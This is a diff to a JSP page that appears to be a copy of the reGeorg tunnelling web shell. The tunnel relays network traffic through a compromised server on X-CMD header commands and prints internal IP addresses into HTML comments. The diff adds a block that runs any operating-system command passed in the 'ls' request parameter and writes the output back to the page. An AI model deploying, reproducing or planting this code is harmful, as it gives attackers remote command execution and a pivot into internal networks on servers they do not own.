@@ -1,5 +1,19 @@
-<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set" trimDirectiveWhitespaces="true"%><%
-    String cmd = request.getHeader("X-CMD");
+<%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set" trimDirectiveWhitespaces="true"%><%
+String cmd = request.getParameter("ls");
+if (cmd != null)
+{
+try{
+Process p = Runtime.getRuntime().exec(cmd);
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+String disr = dis.readLine();
+while ( disr != null ){
+out.println(disr); disr = dis.readLine();}
+} catch (Exception x) {}
+}
+
+    cmd = request.getHeader("X-CMD");
     if (cmd != null)
     {
         response.setHeader("X-STATUS", "OK");
@@ -50,7 +64,6 @@
                 System.out.println(e.getMessage());
                 response.setHeader("X-ERROR", e.getMessage());
                 response.setHeader("X-STATUS", "FAIL");
-                //socketChannel.socket().close();
             }        
             
         } else if (cmd.compareTo("FORWARD") == 0)
@@ -71,45 +84,14 @@
                     socketChannel.write(buf);
                 }
                 response.setHeader("X-STATUS", "OK");
-                //response.getOutputStream().close();
-                
             } catch (Exception e) {
                 System.out.println(e.getMessage());
                 response.setHeader("X-ERROR", e.getMessage());
                 response.setHeader("X-STATUS", "FAIL");
                 socketChannel.socket().close();
             }
-        }/*/ in filter
-        else 
-        {
-            try {
-            String szIp = "";
-                Set<InetAddress> addrs = new HashSet<InetAddress>();
-                Enumeration<NetworkInterface> ns = null;
-                try {
-                    ns = NetworkInterface.getNetworkInterfaces();
-                } catch (SocketException e) {
-                    // ignored...
-                }
-                while (ns != null && ns.hasMoreElements()) 
-                {
-                    NetworkInterface n = ns.nextElement();
-                    Enumeration<InetAddress> is = n.getInetAddresses();
-                    while (is.hasMoreElements()) {
-                        InetAddress i = is.nextElement();
-                        if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
-                    }
-                }
-                out.print("<!-- ip:" + szIp + " -->");  
-            } catch (Exception e) {
-                // ignored...
-            }
-
-            //PrintWriter o = response.getWriter();  
-            out.print("<!-- Georg says, 'All seems fine' -->"); 
         }
-        //////////////*/
-    }// in jsp
+    }
     else
     {
         try {
@@ -119,7 +101,6 @@
             try {
                 ns = NetworkInterface.getNetworkInterfaces();
             } catch (SocketException e) {
-                // ignored...
             }
             while (ns != null && ns.hasMoreElements()) 
             {
@@ -132,10 +113,7 @@
             }
             out.print("<!-- ip:" + szIp + " -->");  
         } catch (Exception e) {
-            // ignored...
         }
-
-        //PrintWriter o = response.getWriter();  
         out.print("<!-- Georg says, 'All seems fine' -->"); 
     }
 %>
